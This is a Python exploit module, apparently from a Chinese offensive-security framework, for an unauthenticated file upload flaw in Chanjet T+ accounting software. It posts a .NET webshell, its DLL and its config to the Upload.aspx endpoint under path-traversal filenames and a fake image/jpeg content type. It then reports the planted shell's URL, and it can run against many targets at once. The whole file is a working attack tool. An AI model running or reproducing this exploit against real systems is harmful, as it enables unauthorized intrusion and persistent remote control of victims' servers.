import aiohttp

from zerooo.core.asyncpool import async_run
from zerooo.core.log import LOGGER
from zerooo.core.options import Option, OptArgset
from zerooo.request.httpclient import HttpClient
from zerooo.utils.util import return_shell_file


class Zerooosploit(Option):

    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            'Name': '用友畅捷通T+任意文件上传',
            'Module': 'exploit/chanjet/t-unauthorized-upload',
            'Product': 'chanjet',
            'Cve': '',
            'Create_date': '20210902',
            'Description': '用友畅捷通T+任意文件上传',
            'Authors': '01sec',
            'References': ''
        }

        self.option = {
            'urls': {'Current Setting': OptArgset.urls, 'Required': 'yes', 'Description': '目标url，多个目标请用,分开'},
            'limit': {'Current Setting': None, 'Required': 'no', 'Description': '并发限制（默认根据当前系统自动调整）'},
            'webshell': {'Current Setting': None, 'Required': 'yes', 'Description': '.net webshell文件'},
            'webshell_dll': {'Current Setting': None, 'Required': 'yes', 'Description': '.net webshell编译后的动态库'},
            'webshell_compiled': {'Current Setting': None, 'Required': 'yes', 'Description': '.net webshell配置文件'},
        }

    async def t_unauthorized_upload(self, urls):
        webshell = self.get_options('webshell')
        webshell_dll = self.get_options('webshell_dll')
        webshell_compiled = self.get_options('webshell_compiled')
        webshell_content, flag = return_shell_file(webshell)
        if not flag:
            return None
        webshell_dll_content, flag = return_shell_file(webshell_dll)
        if not flag:
            return None
        webshell_compiled_content, flag = return_shell_file(webshell_compiled)
        if not flag:
            return None
        upload_data = aiohttp.FormData(quote_fields=False)
        upload_data.add_field('File1', webshell_content, filename='../../../' + webshell,
                              content_type='image/jpeg', )
        resp = await HttpClient().send_request_cgi('POST',
                                                   url=urls + 'tplus/SM/SetupAccount/Upload.aspx?preload=1',
                                                   data=upload_data)
        if resp:
            if resp['code'] == 200:
                upload_dll_data = aiohttp.FormData(quote_fields=False)
                upload_dll_data.add_field('File1', webshell_dll_content, filename='../../../bin/' + webshell_dll,
                                          content_type='image/jpeg')
                resp1 = await HttpClient().send_request_cgi('POST',
                                                            url=urls + 'tplus/SM/SetupAccount/Upload.aspx?preload=1',
                                                            data=upload_dll_data)
                if resp1:
                    if resp1['code'] == 200:
                        upload_compiled_data = aiohttp.FormData(quote_fields=False)
                        upload_compiled_data.add_field('File1', webshell_compiled_content,
                                                       filename='../../../bin/' + webshell_compiled,
                                                       content_type='image/jpeg')
                        resp2 = await HttpClient().send_request_cgi('POST',
                                                                    url=urls + 'tplus/SM/SetupAccount/Upload.aspx?preload=1',
                                                                    data=upload_compiled_data)
                        if resp2:
                            if resp2['code'] == 200:
                                path = urls + 'tplus/' + webshell + '?preload=1'
                                LOGGER.success(f'上传路径 (Upload path) : {path}')
                        return resp2

        LOGGER.warning(f'不存在任意文件上传漏洞 (No file upload vulnerability) : {urls}')
        return None

    @staticmethod
    def t_unauthorized_upload_callback(future):
        future.result()

    def exploit(self):
        urls = self.get_options('urls')
        limit = self.get_options('limit')
        async_run(self.t_unauthorized_upload, urls, self.t_unauthorized_upload_callback, limit)
        LOGGER.info('运行完成 (exploit complete)')
